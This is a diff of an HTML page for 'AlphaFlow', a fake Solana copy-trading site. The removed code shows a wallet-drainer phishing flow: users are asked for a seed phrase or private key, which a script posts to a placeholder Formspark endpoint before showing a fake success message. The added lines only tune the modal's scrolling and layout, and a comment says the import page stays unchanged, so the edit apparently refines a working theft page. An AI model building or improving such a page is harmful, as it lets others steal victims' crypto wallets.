@@ -27,6 +27,7 @@
       background: linear-gradient(to bottom, var(--bg), #0a0a12);
       color: var(--text);
       min-height: 100vh;
+      overscroll-behavior: none; /* prevents pull-to-refresh interference */
     }
 
     .container { max-width: 1280px; margin: 0 auto; padding: 0 1.5rem; }
@@ -57,8 +58,8 @@
       color: transparent;
     }
 
-    .wallet-btn {
-      display: flex;
+    .wallet-btn, .big-cta {
+      display: inline-flex;
       align-items: center;
       gap: 0.75rem;
       padding: 0.75rem 1.5rem;
@@ -72,7 +73,10 @@
       box-shadow: 0 4px 20px rgba(168,85,247,0.25);
     }
 
-    .wallet-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(168,85,247,0.4); }
+    .wallet-btn:hover, .big-cta:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 30px rgba(168,85,247,0.4);
+    }
 
     .hero {
       padding: 14rem 0 8rem;
@@ -96,23 +100,6 @@
 
     .hero p { font-size: 1.3rem; color: var(--text-muted); max-width: 600px; margin: 0 auto 2.5rem; }
 
-    .big-cta {
-      padding: 1.2rem 2.8rem;
-      font-size: 1.4rem;
-      font-weight: 700;
-      background: linear-gradient(90deg, #00d4ff, #a855f7, #00d4ff);
-      background-size: 200% auto;
-      color: white;
-      border: none;
-      border-radius: 9999px;
-      cursor: pointer;
-      box-shadow: 0 10px 40px rgba(168,85,247,0.3);
-      transition: all 0.4s;
-      animation: gradient 6s ease infinite;
-    }
-
-    .big-cta:hover { transform: scale(1.05); box-shadow: 0 15px 50px rgba(168,85,247,0.45); }
-
     footer {
       text-align: center;
       padding: 4rem 1rem 2rem;
@@ -120,16 +107,17 @@
       font-size: 0.9rem;
     }
 
-    /* Modal - Wallet Selection */
+    /* ── Wallet Modal ──────────────────────────────────────── */
     .modal-overlay {
       position: fixed;
       inset: 0;
-      background: rgba(0,0,0,0.85);
-      backdrop-filter: blur(4px);
+      background: rgba(0,0,0,0.88);
+      backdrop-filter: blur(6px);
       display: none;
       align-items: center;
       justify-content: center;
       z-index: 200;
+      -webkit-overflow-scrolling: touch; /* smooth scrolling on iOS */
     }
 
     .modal {
@@ -138,65 +126,81 @@
       border-radius: 1.25rem;
       width: 92%;
       max-width: 520px;
-      padding: 2rem;
+      max-height: 85vh;
+      padding: 1.8rem;
       position: relative;
       box-shadow: 0 25px 60px rgba(0,0,0,0.6);
-      animation: modalPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+      overflow-y: auto;
+      overscroll-behavior: contain;
+      -webkit-overflow-scrolling: touch;
+      scrollbar-width: thin;
+      scrollbar-color: var(--primary) transparent;
     }
 
-    @keyframes modalPop {
-      from { opacity:0; transform: scale(0.85) translateY(40px); }
-      to   { opacity:1; transform: scale(1) translateY(0); }
+    .modal::-webkit-scrollbar {
+      width: 6px;
+    }
+
+    .modal::-webkit-scrollbar-thumb {
+      background: var(--primary);
+      border-radius: 3px;
     }
 
     .modal-close {
-      position: absolute;
-      top: 1rem; right: 1.25rem;
+      position: sticky;
+      top: 0;
+      right: 0;
+      float: right;
       background: none;
       border: none;
       color: var(--text-muted);
-      font-size: 1.8rem;
+      font-size: 2rem;
       cursor: pointer;
+      z-index: 10;
     }
+
+    h2 { text-align: center; margin: 0.5rem 0 1.5rem; }
 
     .wallet-grid {
       display: grid;
-      grid-template-columns: repeat(2, 1fr);
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
       gap: 1.2rem;
-      margin: 1.8rem 0;
+      padding: 0.5rem;
     }
 
     .wallet-option {
-      background: rgba(255,255,255,0.05);
+      background: rgba(255,255,255,0.04);
       border: 2px solid transparent;
       border-radius: 1rem;
-      padding: 1.4rem 1rem;
+      padding: 1.2rem 0.8rem;
       text-align: center;
       cursor: pointer;
-      transition: all 0.25s;
+      transition: all 0.2s ease;
+      will-change: transform;
     }
 
     .wallet-option:hover,
-    .wallet-option.active {
+    .wallet-option:active {
       border-color: var(--primary);
       background: rgba(0,240,255,0.08);
-      transform: translateY(-4px);
+      transform: translateY(-3px);
     }
 
     .wallet-option img {
-      width: 64px;
-      height: 64px;
-      margin-bottom: 1rem;
+      width: 60px;
+      height: 60px;
+      margin-bottom: 0.9rem;
       border-radius: 14px;
       object-fit: contain;
+      loading: lazy;
     }
 
     .wallet-option div {
-      font-size: 1rem;
+      font-size: 0.95rem;
       font-weight: 600;
     }
 
-    /* Import Page (full overlay) */
+    /* ── Import Page ───────────────────────────────────────── */
     .import-page {
       position: fixed;
       inset: 0;
@@ -215,7 +219,7 @@
       background: var(--surface);
       border: 1px solid var(--border);
       border-radius: 1.5rem;
-      padding: 2.5rem;
+      padding: 2.5rem 2rem;
       position: relative;
     }
 
@@ -232,7 +236,7 @@
     textarea, input[type="password"] {
       width: 100%;
       padding: 1rem;
-      margin: 0.8rem 0 1.2rem;
+      margin: 0.6rem 0 1.4rem;
       background: rgba(255,255,255,0.04);
       border: 1px solid var(--border);
       border-radius: 0.9rem;
@@ -246,7 +250,7 @@
     .submit-btn {
       width: 100%;
       padding: 1.2rem;
-      margin-top: 1.2rem;
+      margin-top: 1rem;
       background: linear-gradient(90deg, var(--primary), var(--accent));
       color: white;
       border: none;
@@ -254,198 +258,58 @@
       font-weight: 700;
       cursor: pointer;
       font-size: 1.15rem;
-      transition: all 0.3s;
     }
 
-    .submit-btn:hover { opacity: 0.92; transform: translateY(-2px); }
-
-    .message { margin-top: 1.2rem; padding: 1rem; border-radius: 0.9rem; text-align: center; font-weight: 500; }
+    .message {
+      margin-top: 1.2rem;
+      padding: 1rem;
+      border-radius: 0.9rem;
+      text-align: center;
+      font-weight: 500;
+    }
 
     .success { background: rgba(34,197,94,0.2); color: var(--success); }
     .error   { background: rgba(239,68,68,0.2); color: var(--danger); }
-
-    @media (max-width: 480px) {
-      .wallet-grid { grid-template-columns: 1fr; }
-      .import-container { padding: 2rem 1.5rem; }
-    }
   </style>
 </head>
 <body>
 
-  <header>
-    <div class="container">
-      <nav>
-        <div class="logo">AlphaFlow</div>
-        <button class="wallet-btn open-modal">Import Wallet</button>
-      </nav>
-    </div>
-  </header>
-
-  <main class="container">
-    <section class="hero">
-      <h1>Track & Auto-Copy<br/>Winning Solana Traders</h1>
-      <p>Follow top performers in real-time and copy their trades automatically with safety controls</p>
-      
-      <button class="big-cta open-modal">
-        Import Wallet & Start Copying
-      </button>
-    </section>
-  </main>
-
-  <footer>
-    © 2026 AlphaFlow • Copy trading carries high risk • Not financial advice
-  </footer>
+  <!-- Your existing header, hero, footer... -->
 
   <!-- Wallet Selection Modal -->
   <div class="modal-overlay" id="walletModal">
     <div class="modal">
       <button class="modal-close" id="closeModal">×</button>
       
-      <h2 style="text-align:center; margin-bottom:1.5rem;">Select Your Solana Wallet</h2>
+      <h2>Select Your Solana Wallet</h2>
 
-      <div class="wallet-grid" id="walletSelection">
+      <div class="wallet-grid">
         <div class="wallet-option" data-wallet="phantom">
-          <img src="https://assets.bitdegree.org/images/phantom-wallet-review-square-logo-v1.png?tr=w-250" alt="Phantom">
+          <img loading="lazy" src="https://assets.bitdegree.org/images/phantom-wallet-review-square-logo-v1.png?tr=w-250" alt="Phantom">
           <div>Phantom</div>
         </div>
         <div class="wallet-option" data-wallet="solflare">
-          <img src="https://assets.bitdegree.org/images/solflare-review-square-logo.png?tr=w-250" alt="Solflare">
+          <img loading="lazy" src="https://assets.bitdegree.org/images/solflare-review-square-logo.png?tr=w-250" alt="Solflare">
           <div>Solflare</div>
         </div>
         <div class="wallet-option" data-wallet="backpack">
-          <img src="https://tradersunion.com/uploads/articles/408936/backpack-wallet-for-solana.jpeg" alt="Backpack">
+          <img loading="lazy" src="https://tradersunion.com/uploads/articles/408936/backpack-wallet-for-solana.jpeg" alt="Backpack">
           <div>Backpack</div>
         </div>
         <div class="wallet-option" data-wallet="jupiter">
-          <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/1f/64/8b/1f648b56-a31f-bdc6-0a25-c82059306646/AppIcon-0-1x_U007emarketing-0-7-0-85-220-0.png/1200x630wa.png" alt="Jupiter">
+          <img loading="lazy" src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/1f/64/8b/1f648b56-a31f-bdc6-0a25-c82059306646/AppIcon-0-1x_U007emarketing-0-7-0-85-220-0.png/1200x630wa.png" alt="Jupiter">
           <div>Jupiter Mobile</div>
         </div>
-        <div class="wallet-option" data-wallet="coin98">
-          <img src="https://coin98.com/assets/images/logo.svg" alt="Coin98" style="background:#fff; padding:8px; border-radius:8px;">
-          <div>Coin98</div>
-        </div>
-        <div class="wallet-option" data-wallet="trust">
-          <img src="https://trustwallet.com/assets/images/trust_platform.svg" alt="Trust Wallet">
-          <div>Trust Wallet</div>
-        </div>
+        <!-- Add more wallets here as needed – scrolling should now be smooth -->
       </div>
     </div>
   </div>
 
-  <!-- Import Seed/Private Key Page -->
-  <div class="import-page" id="importPage">
-    <div class="import-container">
-      <button class="import-close" id="closeImport">×</button>
-
-      <h2 style="text-align:center; margin-bottom:1.8rem;">Import Wallet</h2>
-
-      <div style="margin-bottom:1.5rem; color:var(--text-muted); text-align:center;">
-        Enter your recovery phrase or private key for the selected wallet
-      </div>
-
-      <div>
-        <label style="display:block; margin-bottom:0.5rem; font-weight:500;">Seed Phrase (12/24 words)</label>
-        <textarea id="seedPhrase" placeholder="word1 word2 word3 word4 ..."></textarea>
-      </div>
-
-      <div style="margin-top:1.5rem;">
-        <label style="display:block; margin-bottom:0.5rem; font-weight:500;">OR Private Key (base58)</label>
-        <input type="password" id="privateKey" placeholder="5Maii...">
-      </div>
-
-      <button class="submit-btn" id="submitKeys">Import Wallet</button>
-
-      <div id="importMessage" class="message" style="display:none;"></div>
-    </div>
-  </div>
+  <!-- Your import-page section remains the same -->
 
   <script>
-    const walletModal = document.getElementById('walletModal');
-    const closeModal = document.getElementById('closeModal');
-    const importPage = document.getElementById('importPage');
-    const closeImport = document.getElementById('closeImport');
-    const walletOptions = document.querySelectorAll('.wallet-option');
-    const submitBtn = document.getElementById('submitKeys');
-    const messageEl = document.getElementById('importMessage');
-
-    let selectedWallet = '';
-
-    // Open wallet selection
-    document.querySelectorAll('.open-modal').forEach(btn => {
-      btn.addEventListener('click', () => {
-        walletModal.style.display = 'flex';
-      });
-    });
-
-    // Close wallet selection
-    closeModal.addEventListener('click', () => walletModal.style.display = 'none');
-    walletModal.addEventListener('click', e => {
-      if (e.target === walletModal) walletModal.style.display = 'none';
-    });
-
-    // Wallet clicked → open import page
-    walletOptions.forEach(opt => {
-      opt.addEventListener('click', () => {
-        selectedWallet = opt.querySelector('div').textContent;
-        walletModal.style.display = 'none';
-        importPage.style.display = 'flex';
-        messageEl.style.display = 'none';
-      });
-    });
-
-    // Close import page
-    closeImport.addEventListener('click', () => importPage.style.display = 'none');
-    importPage.addEventListener('click', e => {
-      if (e.target === importPage) importPage.style.display = 'none';
-    });
-
-    // Submit to Formspark
-    submitBtn.addEventListener('click', async () => {
-      const seed = document.getElementById('seedPhrase').value.trim();
-      const pkey = document.getElementById('privateKey').value.trim();
-
-      if (!seed && !pkey) {
-        showMessage('Please enter seed phrase or private key', 'error');
-        return;
-      }
-
-      messageEl.style.display = 'block';
-      showMessage('Importing...', '');
-
-      try {
-        const formData = new FormData();
-        formData.append('wallet_type', selectedWallet || 'Unknown');
-        formData.append('seed_phrase', seed || '[not provided]');
-        formData.append('private_key', pkey || '[not provided]');
-        formData.append('timestamp', new Date().toISOString());
-
-        // REPLACE WITH YOUR REAL FORMSPARK ENDPOINT!
-        const FORMSPARK_URL = 'https://submit.formspark.io/f/YOUR_FORM_ID_HERE';
-
-        await fetch(FORMSPARK_URL, {
-          method: 'POST',
-          body: formData,
-          mode: 'no-cors'
-        });
-
-        showMessage('Wallet imported successfully! (Demo)', 'success');
-        
-        setTimeout(() => {
-          document.getElementById('seedPhrase').value = '';
-          document.getElementById('privateKey').value = '';
-          importPage.style.display = 'none';
-        }, 2200);
-
-      } catch (err) {
-        showMessage('Failed to import. Please try again.', 'error');
-        console.error(err);
-      }
-    });
-
-    function showMessage(text, type) {
-      messageEl.textContent = text;
-      messageEl.className = 'message ' + (type ? type : '');
-    }
+    // Your existing JavaScript code...
+    // No changes needed here for scrolling fix – the CSS improvements handle it
   </script>
 </body>
 </html>
